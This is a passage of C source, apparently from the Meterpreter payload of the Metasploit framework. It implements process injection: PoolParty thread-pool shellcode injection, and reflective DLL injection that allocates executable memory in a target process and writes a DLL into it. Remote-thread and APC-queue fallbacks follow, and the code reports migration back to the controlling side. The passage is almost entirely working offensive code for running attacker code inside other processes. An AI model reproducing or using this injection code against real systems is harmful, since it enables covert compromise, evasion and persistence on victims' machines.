			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!");
		}

		if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
		}

		for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
			if (poolparty->variants[variant].isInjectionSupported) {
#ifdef DEBUGTRACE
				char* VARIANT_POS_TO_STR[POOLPARTY_TECHNIQUE_COUNT] = {
					"POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION",
				};
				dprintf("[INJECT][inject_via_poolparty] Attempting injection with variant %s", VARIANT_POS_TO_STR[variant]);
#endif
				dwResult = poolparty->variants[variant].handler(hProcess, dwDestinationArch, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent);
				if (dwResult == ERROR_SUCCESS) {
					dprintf("[INJECT] inject_via_poolparty: injected!");
					break;
				}
			}
		}
		if (dwResult != ERROR_SUCCESS) {
			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_INVALID_FUNCTION)
		}

		if (remote && response)
		{
			dprintf("[INJECT] inject_via_poolparty: Sending a migrate response...");
			// Send a successful response to let the ruby side know that we've pretty
			// much successfully migrated and have reached the point of no return
			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
			packet_transmit_response(ERROR_SUCCESS, remote, response);

			dprintf("[INJECT] inject_via_poolparty: Sleeping for two seconds...");
			// Sleep to give the remote side a chance to catch up...
			Sleep(2000);

		}
		SetEvent(hTriggerEvent);
		SetLastError(dwResult);
		CloseHandle(hTriggerEvent);

	} while (0);
	return dwResult;
}

/*
 * Inject a DLL image into a process via Reflective DLL Injection.
 *
 * Note: You must inject a DLL of the correct target process architecture, (e.g. a PE32 DLL for 
 *       an x86 (wow64) process or a PE64 DLL for an x64 process). The wrapper function ps_inject_dll()
 *       in stdapi will handle this automatically.
 *
 * Note: GetReflectiveLoaderOffset() has a limitation of currenlty not being able to work for PE32 DLL's 
 *       in a native x64 meterpereter due to compile time assumptions, however GetReflectiveLoaderOffset() 
 *       will check for this and fail gracefully.
 *
 * Note: This function largely depreciates LoadRemoteLibraryR().
 * 
 * @param dwPid The process to inject into.
 * @param dwDestinationArch The arechitecture of the process to inject into. If this value is PROCESS_ARCH_UNKNOWN, then
 *        dwMeterpreterArch is used.
 * @param lpDllBuffer The DLL buffer to inject into the process. The DLL architecture must match the target PID.
 * @param dwDllLength The length in bytes of the DLL buffer.
 * @param reflectiveLoader The reflective loader function to call.
 * @param lpArg The argument to pass to the reflective loader function. See stArgSize for details.
 * @param stArgSize The size in bytes of lpArg. If this value is non-zero, it specifies the number of bytes that are
 *        copied into the target process. If this value is zero, then the value of lpArg is passed directly to the
 *        target and must be set to a valid address within the target process.
 */


DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, LPVOID lpArg, SIZE_T stArgSize)
{
	DWORD dwResult = ERROR_ACCESS_DENIED;
	LPVOID lpRemoteArg = NULL;
	HANDLE hProcess = NULL;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPVOID lpReflectiveLoader = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	BOOL bPoolParty = supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch);
	do
	{
		if (!lpDllBuffer || !dwDllLength)
			BREAK_WITH_ERROR("[INJECT] inject_dll. No Dll buffer supplied.", ERROR_INVALID_PARAMETER);
		if (dwDestinationArch == PROCESS_ARCH_UNKNOWN)
			dwDestinationArch = dwMeterpreterArch;

		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpDllBuffer, reflectiveLoader);
		if (!dwReflectiveLoaderOffset)
			BREAK_WITH_ERROR("[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION);

		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
		if (!hProcess)
			BREAK_ON_ERROR("[INJECT] inject_dll. OpenProcess failed.");

		if (lpArg)
		{
			if (stArgSize)
			{
				// alloc some space and write the argument which we will pass to the injected dll...
				lpRemoteArg = VirtualAllocEx(hProcess, NULL, stArgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
				if (!lpRemoteArg)
					BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");

				if (!WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
					BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
			}
			else
			{
				// if only lpArg is specified, pass it as-is without allocating space for it and copying the contents
				lpRemoteArg = lpArg;
			}
		}

		// alloc memory (RWX) in the host process for the image...
		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwDllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 2 failed");

		// write the image into the host process...
		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
			BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 2 failed");

		// add the offset to ReflectiveLoader() to the remote library address...
		lpReflectiveLoader = (LPVOID)((DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

		// First we try to inject by directly creating a remote thread in the target process
		if (bPoolParty) {
			dwResult = inject_via_poolparty(NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg);
			if (dwResult != ERROR_SUCCESS) {
				dprintf("[INJECT] inject_via_poolparty failed, proceeding with legacy injection.");
				// Reset dwResult and set bPoolParty to FALSE.
				dwResult = ERROR_SUCCESS;
				bPoolParty = FALSE;
			}
		
		}

		if (!bPoolParty) {
			if (inject_via_remotethread(NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg) != ERROR_SUCCESS)
			{
				dprintf("[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...");

				// If that fails we can try to migrate via a queued APC in the target process
				if (inject_via_apcthread(NULL, NULL, hProcess, dwPid, dwDestinationArch, lpReflectiveLoader, lpRemoteArg) != ERROR_SUCCESS)
					BREAK_ON_ERROR("[INJECT] inject_dll. inject_via_apcthread failed")
			}
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	if (hProcess)
		CloseHandle(hProcess);

	return dwResult;
}